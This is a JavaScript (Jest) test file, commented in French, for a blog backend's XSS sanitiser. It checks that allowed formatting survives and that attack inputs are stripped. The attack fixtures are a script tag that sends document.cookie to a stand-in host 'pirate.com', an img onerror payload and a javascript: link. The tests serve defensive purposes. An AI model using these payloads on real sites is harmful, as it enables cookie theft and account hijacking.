const sanitizeContent = require('../utils/sanitizeContent');

describe('Fonction Backend : sanitizeContent (Sécurité XSS)', () => {

    describe('Cas normaux (Articles et Commentaires standards)', () => {
        test('Laisse passer un texte brut sans modification', () => {
            const texte = "Ceci est un super commentaire pour le blog.";
            expect(sanitizeContent(texte)).toBe(texte);
        });

        test('Conserve les balises de formatage autorisées (ex: gras et paragraphes)', () => {
            const texte = "<p>Un article <b>très</b> important.</p>";
            expect(sanitizeContent(texte)).toBe("<p>Un article <b>très</b> important.</p>");
        });
    });

    describe('Protection XSS (Tentatives de piratage)', () => {
        test('Attaque 1 : Supprime la balise <script> et le code malveillant', () => {
            const attaqueScript = "<script>fetch('http://pirate.com?cookie=' + document.cookie)</script>Super !";
            expect(sanitizeContent(attaqueScript)).toBe("Super !");
        });

        test('Attaque 2 : Neutralise les injections via des événements javascript masqués (onerror)', () => {
            const attaqueImage = "<img src='faux.jpg' onerror='alert(\"Piraté !\")' />";
            expect(sanitizeContent(attaqueImage)).toBe("");
        });

        test('Attaque 3 : Bloque les liens exécutant du Javascript', () => {
            const attaqueLien = "<a href=\"javascript:alert('Hacked')\">Cliquez ici</a>";
            expect(sanitizeContent(attaqueLien)).toBe("<a>Cliquez ici</a>");
        });
    });

    describe('Gestion des erreurs de type', () => {
        test('Retourne une chaîne vide si l\'entrée est null', () => {
            expect(sanitizeContent(null)).toBe("");
        });
        
        test('Retourne une chaîne vide si l\'entrée est undefined', () => {
            expect(sanitizeContent(undefined)).toBe("");
        });
    });

});